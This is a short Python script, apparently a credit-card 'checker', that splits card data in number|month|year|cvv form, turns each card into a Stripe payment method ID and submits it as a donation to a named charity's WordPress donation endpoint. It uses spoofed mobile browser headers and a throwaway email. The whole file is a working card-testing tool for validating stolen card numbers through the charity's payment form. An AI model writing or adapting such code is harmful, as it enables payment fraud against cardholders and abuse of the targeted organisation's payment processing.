import requests
from pm import extractpm
import time

def checker(cc):       
    try:        
        cc_data = cc.strip().split('|')
        if len(cc_data) != 4:
            raise ValueError(f"Unexpected format for card data: {cc_data}")
    
        cnn, month, year, cvv = map(str.strip, cc_data)
        if year.startswith("20"):
            year = year[2:]
        pm = extractpm(cnn, month, year, cvv)
       # print(pm)
    except ValueError as e:
        print(f"Error processing card: {e}")
        
    
    url = "https://levchabad.org/wp-admin/admin-ajax.php"

    payload = {
    'action': 'wp_full_stripe_inline_donation_charge',
    'wpfs-form-name': 'levchabad18122024',
    'wpfs-form-get-parameters': '%7B%7D',
    'wpfs-custom-amount': 'other',
    'wpfs-custom-amount-unique': '1',
    'wpfs-donation-frequency': 'one-time',
    'wpfs-custom-input[]': '8383883',
    'wpfs-card-holder-email': 'singyi99099@gmail.com',
    'wpfs-card-holder-name': 'Niko',
    'wpfs-stripe-payment-method-id': f'{pm}',
}



    headers = {
    'authority': 'levchabad.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://levchabad.org',
    'referer': 'https://levchabad.org/levchabaddonate/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
    
    response = requests.post(url, data=payload, headers=headers)

    result2 = response.text
    print(response.text)
    return result2
    
    